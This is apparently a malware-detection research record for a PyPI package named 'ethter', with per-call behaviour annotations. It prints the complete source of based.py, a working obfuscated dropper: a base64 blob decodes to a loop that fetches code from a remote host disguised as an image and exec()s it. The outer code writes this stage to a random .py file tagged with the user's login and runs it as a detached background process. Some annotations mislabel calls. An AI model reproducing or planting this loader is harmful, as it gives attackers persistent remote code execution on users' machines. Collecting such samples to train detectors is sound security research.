{
  "metadata": {
    "package_name": "ethter-1",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/ethter-1.10.1b1.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "based.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/ethter-1.10.1b1/ethter-1.10.1b1/ethter/utils/based.py",
      "code_snippets": [
        {
          "snippet": "import base64\nimport sys\nimport os\nimport subprocess\nimport random\nimport string\nimport platform\n\ndef get_random_string(length):\n    letters = string.ascii_lowercase\n    result_str = ''.join(random.choice(letters) for i in range(length))\n    return result_str\n\nstruri = platform.system()[0] + os.getlogin() + '_' + get_random_string(6)\nstrsfx = \"/\"\nif platform.system()[0] == 'W':\n    strsfx = '\\\\'\npypathstr = sys.executable\nstrb = ''\npyexecstr = ''\nstrstraddr = 'DQppbXBvcnQgYmFzZTY0DQppbXBvcnQgdXJsbGliLnJlcXVlc3QNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IHRlbXBmaWxlDQppbXBvcnQgc3lzDQppbXBvcnQgb3MNCmltcG9ydCBzdWJwcm9jZXNzDQppbXBvcnQgdGltZQ0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHN0cmluZw0KDQpweXBhdGhzdHIgPSBzeXMuZXhlY3V0YWJsZQ0KYmluZXhpdCA9IDANCnNhbXBsZV9zdHJpbmcgPSAnJw0Kc3Ryc3RyYWRyID0naHR0cHM6Ly9ldGhlcnRlc3RuZXQucHJvL3BhcGVycGluMzkwMi5qcGcnDQpzdHJiID0gJycNCnN0cnAgPSAnJw0KZGVsYXlJblNlY29uZHMgPSA2MA0KcHlleGVjc3RyID0gJycNCg0KZGVmIGdldF9yYW5kb21fc3RyaW5nKGxlbmd0aCk6DQogICAgIyBjaG9vc2UgZnJvbSBhbGwgbG93ZXJjYXNlIGxldHRlcg0KICAgIGxldHRlcnMgPSBzdHJpbmcuYXNjaWlfbG93ZXJjYXNlDQogICAgcmVzdWx0X3N0ciA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShsZXR0ZXJzKSBmb3IgaSBpbiByYW5nZShsZW5ndGgpKQ0KICAgIHJldHVybiByZXN1bHRfc3RyDQogICAgDQp3aGlsZSBiaW5leGl0ID09IDA6DQoJcHlleGVjc3RyID0gJycNCglzdHJiID0gJycNCgltbWtiID0gJycNCglzdHJwID0gJycNCgltbWtwID0gJycNCgl0cnk6DQoJCXggPSByZXF1ZXN0cy5nZXQoc3Ryc3RyYWRyLCBoZWFkZXJzPXsnQ2FjaGUtQ29udHJvbCc6ICduby1jYWNoZScsICJQcmFnbWEiOiAibm8tY2FjaGUifSkNCgkJYmFzZTY0X3N0cmluZyA9IHgudGV4dA0KCQlzZm09YmFzZTY0X3N0cmluZy5maW5kKCJ8IikNCgkJaWYgc2ZtID4gMDoNCgkJCW1ta3A9YmFzZTY0X3N0cmluZ1swOnNmbV0NCgkJCW1ta2I9YmFzZTY0X3N0cmluZ1tzZm0rMTpsZW4oYmFzZTY0X3N0cmluZyldDQoJCWVsc2U6DQoJCQltbWtiID0gYmFzZTY0X3N0cmluZw0KDQoJCWlmIGxlbihtbWtwKSA+IDA6DQoJCQliYXNlNjRfYnl0ZXMgPSBtbWtwLmVuY29kZSgiYXNjaWkiKQ0KCQkJc2FtcGxlX3N0cmluZ19ieXRlcyA9IGJhc2U2NC5iNjRkZWNvZGUoYmFzZTY0X2J5dGVzKQ0KCQkJc3RycCA9IHNhbXBsZV9zdHJpbmdfYnl0ZXMuZGVjb2RlKCJhc2NpaSIpDQoNCgkJaWYgbGVuKG1ta2IpID4gMDoNCgkJCWJhc2U2NF9ieXRlcyA9IG1ta2IuZW5jb2RlKCJhc2NpaSIpDQoJCQlzYW1wbGVfc3RyaW5nX2J5dGVzID0gYmFzZTY0LmI2NGRlY29kZShiYXNlNjRfYnl0ZXMpDQoJCQlzdHJiID0gc2FtcGxlX3N0cmluZ19ieXRlcy5kZWNvZGUoImFzY2lpIikNCglleGNlcHQ6DQoJCXBhc3MNCglpZiBsZW4oc3RyYikgPiAwOg0KCQl0cnk6DQoJCQlleGVjKHN0cmIpDQoJCWV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCgkJCXBhc3MJDQoJDQoJdGltZS5zbGVlcChkZWxheUluU2Vjb25kcyk='\n\nif len(strstraddr) > 0:\n    base64_bytes = strstraddr.encode(\"ascii\")\n    sample_string_bytes = base64.b64decode(base64_bytes)\n    newstrb = sample_string_bytes.decode(\"ascii\")\n\nstrb = newstrb.replace(\"paperpin3902\", struri)\n\nif len(strb) > 0:\n    try:\n        pyexecstr = os.getcwd() + strsfx + get_random_string(8) + \".py\"\n        f = open(pyexecstr, \"w\")\n        f.write(strb)\n        f.close()\n    except:\n        pass\n\nif len(pyexecstr) > 0:\n    if platform.system()[0] == 'W':\n        pid = subprocess.Popen([pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL) \n    else:\n        subprocess.Popen([pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)",
          "triple_sequences": [
            {
              "action_api": "platform.system()",
              "action_description": "Retrieves operating system information",
              "action_id": "get_os_info",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system name",
              "intention_id": "get_operating_system_name"
            },
            {
              "action_api": "os.getlogin()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access current username",
              "intention_id": "access_current_username"
            },
            {
              "action_api": "get_random_string()",
              "action_description": "Generate random integer",
              "action_id": "generate_random_integer",
              "object": "6",
              "object_description": "Random string",
              "object_id": "random_string",
              "intention_description": "Create random file name",
              "intention_id": "create_random_filename"
            },
            {
              "action_api": "sys.executable",
              "action_description": "Retrieves Python interpreter version",
              "action_id": "get_python_version",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get Python executable path",
              "intention_id": "get_python_executable_path"
            },
            {
              "action_api": "strstraddr.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "strstraddr",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Prepare data for base64 decoding",
              "intention_id": "prepare_data_base64_decoding"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "base64_bytes",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "sample_string_bytes.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "sample_string_bytes",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare string for execution",
              "intention_id": "prepare_string_execution"
            },
            {
              "action_api": "newstrb.replace()",
              "action_description": "Reverse string",
              "action_id": "reverse_string",
              "object": "paperpin3902, struri",
              "object_description": "String containing environment data",
              "object_id": "string_environment_data",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "get_random_string()",
              "action_description": "Generate random integer",
              "action_id": "generate_random_integer",
              "object": "8",
              "object_description": "Random string",
              "object_id": "random_string",
              "intention_description": "Create random file name",
              "intention_id": "create_random_filename"
            },
            {
              "action_api": "os.getcwd()",
              "action_description": "Returns current working directory",
              "action_id": "get_working_dir",
              "object": "",
              "object_description": "Current working directory",
              "object_id": "current_working_directory",
              "intention_description": "Collect working directory",
              "intention_id": "collect_working_directory"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "pyexecstr, \"w\"",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "f.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "strb",
              "object_description": "Script file content",
              "object_id": "script_file_content",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "f.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command without shell window",
              "action_id": "spawn_process_no_window",
              "object": "[pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL",
              "object_description": "Temporary Python script",
              "object_id": "temporary_python_script",
              "intention_description": "Run temporary Python script in background",
              "intention_id": "run_temp_python_background"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command without shell window",
              "action_id": "spawn_process_no_window",
              "object": "[pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL",
              "object_description": "Temporary Python script",
              "object_id": "temporary_python_script",
              "intention_description": "Run temporary Python script in background",
              "intention_id": "run_temp_python_background"
            }
          ]
        }
      ]
    }
  ]
}